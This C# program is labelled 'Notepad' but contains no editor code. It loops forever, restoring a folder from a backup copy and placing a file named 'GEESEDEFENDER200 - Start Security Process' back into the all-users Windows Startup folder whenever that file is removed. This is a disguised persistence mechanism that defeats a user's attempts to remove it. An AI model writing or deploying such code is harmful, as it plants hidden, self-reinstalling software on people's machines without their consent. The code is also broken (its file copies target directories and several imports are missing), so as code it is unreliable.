using System.IO;
using System.Security.Principal;

namespace Notepad
{
    class Notepad
    {
        static void Main(string[] args)
        {
            while (true)
            {
                string directoryPath = File.ReadAllText("directoryPath.txt");
                if (!Directory.Exists(directoryPath))
                {
                    Directory.CreateDirectory(directoryPath);
                    Directory.CreateDirectory(Path.Join(directoryPath, "Assets"));
                    foreach (string file in Directory.GetFiles(@".\BackupAssets"))
                    {
                        if (!file.Contains("GEESEDEFENDER200 - Start Security Process"))
                        {
                            File.Copy(file, directoryPath);
                        }
                        
                    }
                    foreach (string file in nestedDirectories(@".\BackupAssets\Assets"))
                    {
                        File.Copy(file, directoryPath);
                    }
                    
                }
                if (!File.Exists(@"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\GEESEDEFENDER200 - Start Security Process"))
                {
                    File.Copy(@".\BackupAssets\GEESEDEFENDER200 - Start Security Process", @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\");
                }
                Thread.Sleep(1000);
            }
        }
        static string[] nestedDirectories(string directoryPath)
        {
            List<string> output = new();
            foreach (string file in Directory.GetFiles (directoryPath))
            {
                output.Add(file);
            }
            if (Directory.GetDirectories(directoryPath).Count() > 0)
            {
                foreach (string directory in Directory.GetDirectories(directoryPath))
                {
                    foreach (string file in nestedDirectories(directory))
                    {
                        output.Add(file);
                    }
                }
            }
            return output.ToArray();
        }
    }
}